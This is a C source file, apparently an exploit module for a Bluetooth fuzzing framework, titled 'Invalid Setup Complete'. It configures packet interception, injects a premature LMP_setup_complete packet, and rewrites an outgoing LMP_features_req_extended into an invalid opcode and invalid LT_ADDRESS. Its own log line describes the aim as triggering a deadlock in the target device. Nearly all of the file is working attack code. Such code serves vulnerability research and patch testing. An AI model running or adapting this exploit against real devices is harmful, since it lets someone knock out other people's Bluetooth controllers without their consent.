#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters
static const char *filter_lmp_encryption_key_size_req;
static const char *filter_lmp_accepted_key_size_req;
// Vars
static bool sent_enc_key_size = false;

// Setup
static const char *module_name()
{
    return "Invalid Setup Complete";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

// LMP_setup_complete
static uint8_t packet[] = {0x99, 0x3, 0xf, 0x0, 0x62, 0x20 };
static char txt[64];
static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Send LMP_setup_complete just after LMP_features_req
    if (p && pkt_length >= 5 && ((pkt_buf[4] >> 1) == 39))
    {
    	module_request_t *m = (module_request_t *)p;
	    m->tx_count = 1;
	    m->pkt_buf = packet;
	    m->pkt_len = sizeof(packet);
        return 0; // Indicate that packet has been changed
    }

    // LMP_features_req_extended to unkown opcode
    if (p && pkt_length >= 6 && ((pkt_buf[4] >> 1) == 127) && (pkt_buf[5] == 3))
    {
        pkt_buf[0] = 0x1b; // Optional: change LT_ADDRESS to 3 (invalid), this accelerates the deadlock
        pkt_buf[4] = 0xa9; // Change opcode to an invalid one (Unkown opcode)
        wd_log_y("Exploit triggered, waiting deadlock...");
        return 1; // Indicate that packet has been changed
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}